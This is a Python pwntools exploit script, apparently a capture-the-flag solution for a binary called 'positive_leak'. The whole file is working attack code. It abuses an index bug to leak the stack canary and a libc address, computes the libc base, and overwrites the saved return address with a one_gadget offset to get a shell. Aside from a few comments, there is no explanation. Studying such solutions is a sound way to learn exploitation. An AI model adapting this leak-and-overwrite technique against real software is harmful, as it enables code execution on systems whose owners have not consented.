from pwn import *

context.arch = "amd64"

LIBC_PATH = "./downloads/libc.so.6"

LIBC = ELF(LIBC_PATH)

CHALL_PATH = "./positive_leak_patched"

CHALL = ELF(CHALL_PATH)

COMMANDS = '''
        brva 0x13CA
        c
        '''

if args.REMOTE:
    pass
else:
    if args.GDB:
        r = gdb.debug(CHALL_PATH, gdbscript=COMMANDS)
    else:
        r = process(CHALL_PATH)


#overwrite the index in position 6 to leak the libc

r.recvuntil(b"> ")
r.send(b"0")
r.recvuntil(b"would you add?> ")
r.send(b"6")
r.recvuntil(b"> ")
r.send(b"1")
r.recvuntil(b"> ")
r.send(b"1")
r.recvuntil(b"> ")
r.send(b"1")
r.recvuntil(b"> ")
r.send(b"1")
r.recvuntil(b"> ")
r.send(b"1")
r.recvuntil(b"> ")
r.send(bytes(str(0x20ffffffff),'utf-8'))
r.recvuntil(b"> ")
r.send(b"1")

#call to print_numbers
r.recvuntil(b"> ")
r.send(b"1")

for _ in range(9):
    r.recvuntil(b"\n")
canary = r.recvuntil("\n")
canary = int(canary)
canary = abs(~canary + 1)

for _ in range(23):
    r.recvuntil(b"\n")
libc_leaked = r.recvuntil(b"\n")
libc_leaked = int(libc_leaked)
print("Leaked libc: ",hex(libc_leaked))
libc_leaked = int(libc_leaked) - 139

libc_base = libc_leaked - LIBC.symbols['__libc_start_main']
print("LIBC base: ",hex(libc_base))

r.recvuntil(b"*")

print("Canary:",hex(canary))


LIBC.address = libc_base

off_onegadget = 0xef52b
addr_onegadget = LIBC.address + off_onegadget

#overwrite the saved_eip with the address on the libc of onegadget, we don't have to write the canary because we are manipulating the counter
# to write exactly into saved_eip -> the counter is before the canary

r.recvuntil(b"> ")
r.send(b"0")
r.recvuntil(b"would you add?> ")
r.send(b"21")

for _ in range(13):
    r.recvuntil(b"> ")
    r.send(b"0")

r.recvuntil(b"> ")
r.send(bytes(str(0x1200000000),'utf-8'))
print("Counter written")
r.recvuntil(b"> ")
r.send(bytes(str(addr_onegadget),'utf-8'))
print("Libc written")
r.recvuntil(b"> ")
r.send(b"-1")



r.interactive()

